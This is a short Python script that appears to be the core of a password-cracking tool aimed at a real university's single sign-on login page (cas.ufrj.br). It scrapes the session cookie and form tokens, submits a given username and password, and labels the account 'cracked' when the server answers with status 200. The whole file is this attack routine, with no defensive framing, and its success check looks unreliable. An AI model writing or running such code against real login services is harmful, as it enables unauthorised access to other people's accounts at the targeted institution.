#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
from BeautifulSoup import BeautifulSoup

url = "https://cas.ufrj.br/login"

def request(username, password):
  r = requests.get(url)
  session_cookie = r.cookies['_CASinoApp_session']
  cookies = dict(_CASinoApp_session=session_cookie)
  parsed_html = BeautifulSoup(r.content)
  authenticity_token = parsed_html.body.find('input', attrs={'name':'authenticity_token'})['value']
  lt = parsed_html.body.find('input', attrs={'name':'lt'})['value']
  payload = {'authenticity_token': authenticity_token, 'lt': lt, 'service':'https://intranet.ufrj.br/cas?destination=node/4', 'username':username, 'password':password}
  response = requests.request("POST", url, data=payload, cookies=cookies)
  if(response.status_code == 200):
    return " cracked: " + username
  return ''